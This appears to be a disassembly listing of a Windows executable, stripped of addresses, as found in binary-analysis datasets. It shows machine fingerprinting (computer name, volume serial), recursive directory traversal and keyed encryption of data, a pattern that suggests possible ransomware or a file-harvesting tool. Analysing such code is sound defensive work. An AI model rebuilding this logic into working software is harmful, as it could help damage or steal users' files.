push ebx
push esi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45e588
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45ec84
mov ebx [ ebp - 0x14 ]
call sub_40be08
fstp [ ebp - 0x10 ]
fwait
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] ebx
mov edx [ ebp - 0x18 ]
call sub_40ca08
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e58f
lea eax [ ebp - 0x14 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_45e5e0
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_45e851
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_45ea90
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_40a12c
push [ ebp - 0x2c ]
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4051e4
lea ecx [ ebp - 0x14 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
call sub_45ed54
call sub_40be08
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40b8c4
mov eax [ ebp - 0x10 ]
mov ebx eax
test ebx ebx
je r-xdata
mov esi eax
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x30 ]
push eax
mov edx esi
sub edx 0x3
mov ecx 0x4
mov eax [ ebp - 0x10 ]
call sub_405384
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov edx ebx
sub edx 0x5
mov ecx 0x6
mov eax [ ebp - 0x10 ]
call sub_405384
mov eax [ ebp - 0x38 ]
call sub_4099e8
lea ecx [ ebp - 0x34 ]
mov edx 0x5
call sub_409990
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
pop ecx
call sub_405170
lea edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_45ec84
mov ebx [ ebp - 0x3c ]
call sub_40be08
fstp [ ebp - 0x28 ]
fwait
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x40 ] ebx
mov edx [ ebp - 0x40 ]
call sub_40ca08
push [ rw-data ]
lea eax [ ebp - 0x4c ]
call sub_45e960
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x48 ]
call sub_4057bc
push [ ebp - 0x48 ]
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x1c ]
call sub_4057bc
push [ ebp - 0x50 ]
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x58 ]
call sub_40987c
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
call sub_4057bc
push [ ebp - 0x54 ]
lea eax [ ebp - 0x5c ]
mov edx [ ebp - 0x10 ]
call sub_4057bc
push [ ebp - 0x5c ]
lea edx [ ebp - 0x64 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4057bc
push [ ebp - 0x60 ]
lea eax [ ebp - 0x44 ]
mov edx 0x6
call sub_405858
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0xc ]
call sub_4050e8
lea eax [ ebp - 0x68 ]
mov edx [ rw-data ]
call sub_4050e8
mov eax [ ebp - 0x68 ]
call sub_409e18
test al al
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov ebx eax
mov edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax ebx
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e858
lea eax [ ebp - 0x6c ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x60 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x58 ]
call sub_404e44
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x4c ]
call sub_404e44
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x3c ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x1c ]
mov edx 0x7
call sub_404e68
retn
lea eax [ ebp - 0x6c ]
mov edx [ rw-data ]
call sub_4050e8
mov eax [ ebp - 0x6c ]
call sub_409e3c
sub_45e8a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_45e91b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx 0x3e8
call sub_4055ac
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push 0x3e8
call GetTempPathA
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x8 ]
mov edx esi
call sub_4093d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e922
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_45e928
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov [ ebp - 0x4 ] 0xff
mov eax [ ebp - 0x4 ]
call sub_402d28
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetComputerNameA
mov eax esi
mov edx ebx
call sub_40503c
mov eax ebx
call sub_402d44
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e960
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45ea64
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx 0x10
mov al 0x30
call sub_405610
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x14 ]
call sub_405324
push eax
call GetVolumeInformationA
test eax eax
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ea6b
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x18 ]
call sub_45e928
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x4 ]
call sub_45ebf0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp eax 0x8
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
lea ecx [ ebp - 0x20 ]
mov edx 0x8
mov eax [ ebp - 0xc ]
call sub_409990
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_405170
lea ecx [ ebp - 0x1c ]
mov edx 0xd
mov al 0x2d
call sub_405610
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
call sub_40512c
sub_45ea90
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45ebd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax esi
call sub_404e44
jmp r-xdata
mov eax edi
call sub_405120
cmp ebx eax
jle r-xdata
movzx eax [ edi + ebx - 0x1 ]
shr eax 0x2
call sub_45ea80
mov edx eax
lea eax [ ebp - 0xc ]
call sub_40502c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40512c
movzx eax [ edi + ebx - 0x1 ]
shl eax 0x4
movzx edx [ edi + ebx ]
shr edx 0x4
or al dl
call sub_45ea80
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40502c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40512c
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ebdd
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404e68
retn
lea eax [ ebx + 0x1 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx r-xdata
call sub_40512c
movzx eax [ edi + ebx ]
add eax eax
add eax eax
movzx edx [ edi + ebx + 0x1 ]
shr edx 0x6
or al dl
call sub_45ea80
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40502c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40512c
jmp r-xdata
lea eax [ ebx + 0x2 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] edi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40512c
movzx eax [ edi + ebx + 0x1 ]
call sub_45ea80
mov edx eax
lea eax [ ebp - 0x18 ]
call sub_40502c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40512c
jmp r-xdata
add ebx 0x3
sub_45ebf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_45ec75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404e44
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ec7c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov edi 0x1
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edi - 0x1 ]
lea ecx [ ebp - 0x8 ]
mov edx 0x2
call sub_409990
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40512c
inc edi
dec ebx
jne r-xdata
sub_45ec84
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_45ed38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404e44
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed3f
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
mov ebx 0x1
dec eax
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
inc ebx
dec esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405170
mov eax [ ebp - 0xc ]
call sub_4099e8
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_40502c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40512c
mov eax ebx
and eax 0x80000001
jns r-xdata
sub_45ed54
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_45ee70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45ee4e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
lea edx [ ebp - 0x18 ]
mov ecx 0x8
mov eax [ ebp - 0x10 ]
call sub_419524
lea eax [ ebp - 0x38 ]
xor ecx ecx
mov edx 0x20
call sub_403728
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp eax 0x20
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov esi eax
mov esi 0x20
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_405324
lea edx [ ebp - 0x38 ]
mov ecx esi
call sub_402f9c
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x38 ]
xor edx edx
mov eax [ ebp - 0xc ]
call sub_45d75c
mov edx ebx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
call sub_45ebf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee55
mov eax [ ebp - 0xc ]
call sub_403f64
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
sub_45ee80
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_45efc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_45ec84
mov ecx [ ebp - 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45ef9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
lea edx [ ebp - 0x18 ]
mov ecx 0x8
mov eax [ ebp - 0xc ]
call sub_4194ec
lea eax [ ebp - 0x38 ]
xor ecx ecx
mov edx 0x20
call sub_403728
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp eax 0x20
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov esi eax
mov esi 0x20
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_405324
lea edx [ ebp - 0x38 ]
mov ecx esi
call sub_402f9c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push eax
mov eax [ ebp - 0xc ]
call sub_4192c0
pop edx
sub edx eax
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_45d950
mov eax ebx
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efa2
mov eax [ ebp - 0xc ]
call sub_403f64
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
sub_45efd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f047
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f04e
retn
mov eax rw-data
call sub_40566c
mov eax rw-data
call sub_40566c
mov eax rw-data
call sub_40566c
mov eax rw-data
call sub_40566c
mov eax rw-data
mov edx [ r-xdata ]
call sub_405aa4
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
sub_45f050
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_45f13b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x154 ]
push r-xdata
push r-xdata
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x154 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_45e21c
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x154 ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x14 ]
call sub_45e474
push edx
push eax
lea eax [ ebp - 0x10 ]
call sub_409968
push [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
mov edx 0xa
call sub_4051e4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f142
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_404e68
retn
sub_45f1a0
push ebp
mov ebp esp
mov ecx 0x36
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x16c ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x16c ]
call sub_405314
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4059d4
xor eax eax
push ebp
push sub_45f618
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45f59f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x180 ]
mov eax r-xdata
call sub_45ec84
mov ecx [ ebp - 0x180 ]
lea eax [ ebp - 0x17c ]
mov edx [ ebp - 0x4 ]
call sub_405170
mov eax [ ebp - 0x17c ]
lea ecx [ ebp - 0x168 ]
mov edx 0x3f
call sub_409fe0
test eax eax
sete [ ebp - 0x16d ]
jmp r-xdata
cmp [ ebp - 0x16d ] 0x0
jne r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45f3ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x168 ]
call sub_40a030
test eax eax
sete [ ebp - 0x16d ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405270
je r-xdata
xor eax eax
push ebp
push sub_45f5cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x168 ]
call sub_40a054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ rw-data ] 0x33
jne r-xdata
mov eax [ ebp - 0x158 ]
and eax 0x10
cmp eax 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f61f
lea eax [ ebp - 0x1b4 ]
mov edx 0xf
call sub_404e68
lea eax [ ebp - 0x16c ]
call sub_404e44
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405aa4
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
inc [ rw-data ]
cmp [ rw-data ] 0x1388
jne r-xdata
push 0x151
call Sleep
xor eax eax
mov [ rw-data ] eax
lea edx [ ebp - 0x188 ]
mov eax [ ebp - 0x4 ]
call sub_4090e4
mov edx [ ebp - 0x188 ]
mov eax [ rw-data ]
call sub_405468
test eax eax
jg r-xdata
xor eax eax
push ebp
push sub_45f2c5
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x154 ]
lea eax [ ebp - 0x184 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x184 ]
mov edx [ ebp - 0x16c ]
call sub_45f1a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45f574
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x198 ]
mov eax [ rw-data ]
call sub_40987c
mov edx [ ebp - 0x198 ]
mov eax rw-data
call sub_404e98
mov eax [ rw-data ]
mov [ ebp - 0x174 ] eax
mov ebx [ ebp - 0x174 ]
test ebx ebx
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x154 ]
lea eax [ ebp - 0x18c ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x18c ]
call sub_409df4
test al al
je r-xdata
dec ebx
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
inc [ rw-data ]
lea edx [ ebp - 0x190 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x190 ]
mov eax [ ebp - 0x16c ]
call sub_405270
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x178 ] eax
mov esi [ ebp - 0x178 ]
test esi esi
je r-xdata
mov eax rw-data
mov ecx [ rw-data ]
mov edx r-xdata
call sub_405170
push ebp
call sub_45f050
pop ecx
lea edx [ ebp - 0x194 ]
mov eax [ ebp - 0x154 ]
call sub_40a164
mov eax [ ebp - 0x194 ]
mov edx [ ebp - 0x16c ]
call sub_405468
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
sub esi 0x4
mov esi [ esi ]
push ebp
call sub_45f050
pop ecx
jmp r-xdata
lea eax [ ebp - 0x19c ]
call sub_45e960
push [ ebp - 0x19c ]
lea edx [ ebp - 0x1a0 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x1a0 ]
lea eax [ ebp - 0x1a4 ]
call sub_45e504
push [ ebp - 0x1a4 ]
push [ rw-data ]
push r-xdata
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x1a8 ]
call sub_40987c
push [ ebp - 0x1a8 ]
lea edx [ ebp - 0x1ac ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x1ac ]
mov eax rw-data
mov edx 0x7
call sub_4051e4
lea ecx [ ebp - 0x1b0 ]
mov edx 0x10
mov al 0x2d
call sub_405610
mov ecx [ ebp - 0x1b0 ]
xor edx edx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp - 0x16c ]
xor edx edx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
lea edx [ ebp - 0x1b4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x1b4 ]
mov edx [ rw-data ]
call sub_45e5e0
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax rw-data
mov ecx [ rw-data ]
mov edx r-xdata
call sub_405170
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_45f6c0
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45faea
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
call sub_45e1ec
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4090e4
mov edx [ ebp - 0x18 ]
mov eax rw-data
call sub_404e98
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
lea eax [ ebp - 0x20 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4050e8
mov edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x54 ]
call sub_45e960
push [ ebp - 0x54 ]
lea edx [ ebp - 0x58 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x58 ]
lea eax [ ebp - 0x5c ]
call sub_45e504
push [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x60 ]
push r-xdata
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x64 ]
call sub_40987c
push [ ebp - 0x64 ]
lea edx [ ebp - 0x68 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x68 ]
mov eax rw-data
mov edx 0x7
call sub_4051e4
lea eax [ ebp - 0x6c ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4050e8
mov eax [ ebp - 0x6c ]
mov edx [ rw-data ]
call sub_45e5e0
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45faf1
lea eax [ ebp - 0x6c ]
mov edx 0xd
call sub_404e68
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_404e68
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4090e4
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x8 ]
call sub_4093d8
or ebx 0xffffffff
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_4093d8
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov edx eax
test edx edx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
lea edx [ ebp - 0xc ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x8 ]
mov eax edx
test eax eax
je r-xdata
inc edx
xor eax eax
cmp eax ebx
jne r-xdata
sub eax 0x4
mov eax [ eax ]
inc eax
dec edx
jne r-xdata
mov ebx eax
mov esi edx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + eax - 0x1 ] 0x5c
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x1 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_405384
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
sub esi 0x4
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax - 0x1 ] 0x5c
jne r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
push ebp
push sub_45f8b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45f1a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx edx
test ebx ebx
je r-xdata
xor edx edx
push ebp
push sub_45f9f3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_40987c
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404e98
mov eax [ rw-data ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
